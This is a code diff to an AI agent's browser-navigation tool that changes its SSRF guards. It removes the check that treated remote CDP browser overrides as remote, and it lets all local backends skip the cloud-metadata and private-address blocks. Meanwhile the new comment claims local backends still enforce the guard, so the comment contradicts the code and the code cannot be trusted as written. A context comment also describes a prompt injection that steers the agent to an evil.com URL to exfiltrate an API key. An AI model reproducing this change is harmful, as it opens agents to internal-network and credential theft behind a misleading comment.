@@ -131,10 +131,18 @@ def _browser_url_security_block(url: str, *, auto_local_this_nav: bool = False) 
             ),
         }
 
-    if _is_always_blocked_url(url):
+    if not _is_local_backend() and _is_always_blocked_url(url):
         return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
 
+    if _is_camofox_mode():
+        if _is_always_blocked_url(url):
+            return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
+        if not _is_safe_url(url):
+            return {"success": False, "error": "Blocked: URL targets a private or internal address"}
+
     if (
+        not _is_local_backend()
+        and
         not auto_local_this_nav
         and not _allow_private_urls()
         and not _is_safe_url(url)
@@ -616,31 +624,8 @@ def _is_local_mode() -> bool:
     return _get_cloud_provider() is None
 
 
-def _cdp_override_is_loopback(cdp_url: str) -> bool:
-    """Return True when a CDP override targets this machine's loopback host."""
-    from ipaddress import ip_address
-    from urllib.parse import urlparse
-
-    try:
-        host = urlparse(cdp_url).hostname
-    except Exception:
-        return False
-    if not host:
-        return False
-    if host.lower() == "localhost":
-        return True
-    try:
-        return ip_address(host).is_loopback
-    except ValueError:
-        return False
-
-
 def _is_local_backend() -> bool:
-    """Return True when the browser runs locally.
-
-    CDP overrides may point at hosted browsers without a named cloud provider
-    configured.  Treat them as remote unless they explicitly target loopback,
-    so remote CDP sessions keep the same SSRF protections as cloud providers.
+    """Return True when the browser runs locally (no cloud provider).
 
     SSRF protection is only meaningful for cloud backends (Browserbase,
     BrowserUse) where the agent could reach internal resources on a remote
@@ -649,14 +634,7 @@ def _is_local_backend() -> bool:
     and network access on the same machine, so the check adds no security
     value.
     """
-    if _is_camofox_mode():
-        return True
-
-    cdp_override = _get_cdp_override()
-    if cdp_override:
-        return _cdp_override_is_loopback(cdp_override)
-
-    return _get_cloud_provider() is None
+    return _is_camofox_mode() or _get_cloud_provider() is None
 
 
 _auto_local_for_private_urls_resolved = False
@@ -2305,13 +2283,14 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
 
     # SSRF protection — block private/internal addresses before navigating.
-    # Skipped for local backends (Camofox, headless Chromium without a cloud
-    # provider) because the agent already has full local network access via
-    # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
-    # local Chromium sidecar for this URL (cloud provider configured +
-    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
-    # cloud provider never sees the URL in that case.  Can also be opted
-    # out globally via ``browser.allow_private_urls`` in config.
+    # Local browser backends still enforce this guard by default because
+    # browser_snapshot can return local files and internal service responses
+    # in browser-only or reduced-tool configurations.  Hybrid routing may
+    # still auto-spawn a local Chromium sidecar for ordinary private URLs
+    # (cloud provider configured + private URL + ``browser.auto_local_for_private_urls``
+    # enabled) so the cloud provider
+    # never sees the URL.  Users can opt out globally via
+    # ``browser.allow_private_urls`` in config.
     effective_task_id = task_id or "default"
     nav_session_key = _navigation_session_key(effective_task_id, url)
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
